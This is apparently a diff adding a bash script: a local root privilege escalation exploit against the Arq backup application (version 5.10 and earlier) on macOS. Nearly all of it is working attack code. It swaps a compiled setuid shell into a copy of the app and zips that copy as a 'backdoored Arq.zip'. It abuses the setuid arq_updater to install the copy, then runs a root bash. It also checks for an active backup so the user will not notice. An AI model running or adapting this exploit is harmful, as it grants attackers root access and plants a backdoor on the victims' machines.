@@ -1,0 +1,112 @@
+#!/bin/bash
+
+#################################################################
+###### Arq <= 5.10 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html              ######
+#################################################################
+
+app="/Applications/Arq.app"
+res="$app/Contents/Resources"
+lires="$app/Contents/Library/LoginItems/Arq Agent.app/Contents/Resources"
+
+vuln=`ls -la "$lires/arq_updater" |grep '\-rws' |grep root`
+
+if [ "$vuln" == "" ] ; then
+  echo "Not vulnerable - auto-updates not enabled."
+  exit 1
+fi
+
+if [ "$1" != "-f" ] ; then
+  latest_logfile="`ls -1t ~/Library/Logs/Arq\ Agent/ |head -n1`"
+  status_line="`egrep -i 'backup session.*?(ended|started)' \
+    \"$HOME/Library/Logs/Arq Agent/$latest_logfile\" |tail -n1 |grep -i started`"
+
+  if [ "$status_line" != "" ] ; then
+    echo -n "WARNING: backup in progress, the user will very "
+    echo "likely notice if we exploit now!"
+    echo "use -f to override."
+    exit 1
+  fi
+fi
+
+owd="`pwd`"
+
+if [ -e ~/.arq_510_privesc_exp ] ; then
+  rm -rf ~/.arq_510_privesc_exp
+fi
+
+mkdir ~/.arq_510_privesc_exp
+cd ~/.arq_510_privesc_exp
+
+echo "copying application..."
+
+cp -R /Applications/Arq.app .
+
+echo "compiling payloads..."
+
+cat > payload.sh <<EOF
+#!/bin/bash
+rm -rf $HOME/.arq_510_privesc_exp
+while :
+do
+  pid=\`ps auxwww |grep '$app/Contents/MacOS/Arq' |grep -v grep |xargs \
+    |cut -d ' ' -f2\`
+  if [ "\$pid" != "" ] ; then
+    kill -9 \$pid
+    open $app/Contents/Library/LoginItems/Arq\ Agent.app
+    exit 0
+  fi
+done
+EOF
+chmod 755 payload.sh
+
+au_relative=`echo "$lires/standardrestorer" |sed 's/^\/Applications\///'`
+
+cat > shell.c <<EOF
+#include <unistd.h>
+#include <string.h>
+int main(int ac, char *av[])
+{
+  if (ac > 1 && strcmp(av[1], "boom") == 0) {
+    setuid(0);
+    setgid(0);
+    execl(
+      "/bin/bash","bash","-c","mv -f $res/standardrestorer.orig $res/standardr"
+      "estorer;chmod 4755 $res/standardrestorer;$HOME/.arq_510_privesc_exp/pay"
+      "load.sh;/bin/bash", NULL
+    );
+  }
+  return 0;
+}
+EOF
+mv Arq.app/Contents/Resources/standardrestorer \
+  Arq.app/Contents/Resources/standardrestorer.orig
+gcc -o Arq.app/Contents/Resources/standardrestorer shell.c
+rm -f shell.c
+
+payload_size=`stat Arq.app/Contents/Resources/standardrestorer |cut -d ' ' -f8`
+GID=`id |sed 's/^.*gid=//' |cut -d '(' -f1`
+cwd=`pwd`
+
+echo "creating backdoored Arq.zip..."
+zip -1r Arq.zip Arq.app/ 1>/dev/null 2>/dev/null
+rm -rf Arq.app/
+
+echo "executing upgrade..."
+
+"$lires/arq_updater" installupdate file://$cwd/Arq.zip $UID $GID YES \
+  1>/dev/null 2>/dev/null
+
+echo "waiting..."
+while :
+do
+  ac_size=`stat $res/standardrestorer 2>/dev/null |cut -d ' ' -f8`
+  x=`ls -la $res/standardrestorer |grep -- '-rwsr-xr-x' |grep root`
+
+  if [ "$ac_size" == "$payload_size" -a "$x" != "" ] ; then
+    cd "$owd"
+    $res/standardrestorer boom
+    exit 0
+  fi
+  sleep 0.2
+done
